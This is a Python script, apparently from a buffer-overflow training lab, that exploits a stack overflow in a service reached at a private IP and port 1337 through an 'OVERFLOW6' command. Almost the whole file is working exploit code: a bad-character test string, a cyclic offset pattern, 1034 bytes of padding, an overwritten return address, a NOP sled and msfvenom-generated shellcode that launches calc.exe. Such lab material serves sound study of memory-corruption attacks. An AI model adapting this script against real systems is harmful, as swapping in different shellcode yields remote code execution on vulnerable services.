

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip = '10.10.107.7'
port = 1337

s.connect((ip,port))

msg = s.recv(2048).decode()
print(msg)
allbytes = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

pattern = 'brhIG0RisiA0qnPu2Kjrc0g9b41SzFyVO0hPd3YMUb8XNudH4nG7SsQIjt3Uv0qWFFqg2wDw2NIDYmX3g7V4aC73aG38qJ8LzKHuNPFEuC9E2ibKBevNIDMZyAmi0fGmPWFhxNAKygQcKaNQRli2WHATK9V6QIgx1Mx5xlkQDxEjGoYrzcxDF114jWt3w9soP3uX5BKqkCgIEy4vk4adnrj0zTrdXaX8AXcuF9SSvudO8VSLdnvOx8AY66dnJUjbG6Zg7CTLNG5PM5sS5c9ljN1ROvXiKAZ7AsO8QVbJEqjMbPWkybgrLHDIl1KpwBII18xWJYnUNDdGuGhQerfmazirseSp5uNTSKU8mERWn2DzNGcy9Yq5qT8njPvIO1pZ2YJ16u2XSlEZbr8PTGtVTSI3fWj6JKKKxjeLAoDP5BTQskTSqkUSspKSZdUN2g44hsT4dD7ZoLg2KEH1Fi1KJvbj3uClDKjIOTUK1lZD9V9otuGEqBAGNE2ue3pGx397mYtXOGR0NGVCxXmodT4Jm8i7ZjHstK7g2drLC5rtPlFdlortE77MWYFOL8cVxA3bmnRh3bt0DYCRYVIa0YO0HIY7ZWmdapjR0QJ3rtE2yeyCkySMtdf5KiXzQ44WOUBtHA7EG7CA3tgSJIQShBvpK0yQJImfuobEDbOuHHkinKbHexHkweLCdWTufqfwVfEPNqQDCJ0m319OP94b2U7n98KFXhXsifyqac6CFuYtb6aftZWKKPnvnzzmXrAPx05VQvUixTTUPAZqXdakStHSB0pDzFb6OdI12I954nfaka0941YUZ988btBkq4KvwxbaIC2HgnuP7hoKabDMurZvj81GpAQ8AKkKSsXqlZvVCNmCCgKvNeFKEsIgMQ5UhAGFEXA29vCymkjTf8cljknEuxaLj0QMp171qRWV7zJsaU959j1ajlzHdcqmw2sqtKIpE4tSIwoswPeXhsrDjkLo31WJJVpUqFH7mGOdc7jw'

# 018CFA30   62554D59  YMUb	esp 38
#\x00\x08\x2c\xad

junk = 'A'*1034
eip = '\xaf\x11\x50\x62'

esp = '\x90'*20

#msfvenom -p windows/exec cmd=calc.exe -b "\x00\x08\x2c\xad" -f c
esp += ("\xdd\xc1\xbe\x65\xaf\x2e\x18\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x31\x83\xc7\x04\x31\x77\x14\x03\x77\x71\x4d\xdb\xe4\x91\x13"
"\x24\x15\x61\x74\xac\xf0\x50\xb4\xca\x71\xc2\x04\x98\xd4\xee"
"\xef\xcc\xcc\x65\x9d\xd8\xe3\xce\x28\x3f\xcd\xcf\x01\x03\x4c"
"\x53\x58\x50\xae\x6a\x93\xa5\xaf\xab\xce\x44\xfd\x64\x84\xfb"
"\x12\x01\xd0\xc7\x99\x59\xf4\x4f\x7d\x29\xf7\x7e\xd0\x22\xae"
"\xa0\xd2\xe7\xda\xe8\xcc\xe4\xe7\xa3\x67\xde\x9c\x35\xae\x2f"
"\x5c\x99\x8f\x80\xaf\xe3\xc8\x26\x50\x96\x20\x55\xed\xa1\xf6"
"\x24\x29\x27\xed\x8e\xba\x9f\xc9\x2f\x6e\x79\x99\x23\xdb\x0d"
"\xc5\x27\xda\xc2\x7d\x53\x57\xe5\x51\xd2\x23\xc2\x75\xbf\xf0"
"\x6b\x2f\x65\x56\x93\x2f\xc6\x07\x31\x3b\xea\x5c\x48\x66\x60"
"\xa2\xde\x1c\xc6\xa4\xe0\x1e\x76\xcd\xd1\x95\x19\x8a\xed\x7f"
"\x5e\x64\xa4\x22\xf6\xed\x61\xb7\x4b\x70\x92\x6d\x8f\x8d\x11"
"\x84\x6f\x6a\x09\xed\x6a\x36\x8d\x1d\x06\x27\x78\x22\xb5\x48"
"\xa9\x41\x58\xdb\x31\xa8\xff\x5b\xd3\xb4")

junk2 = 'D'*(2400-len(junk+eip+esp))

payload = 'OVERFLOW6 ' + junk + eip + esp + junk2
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
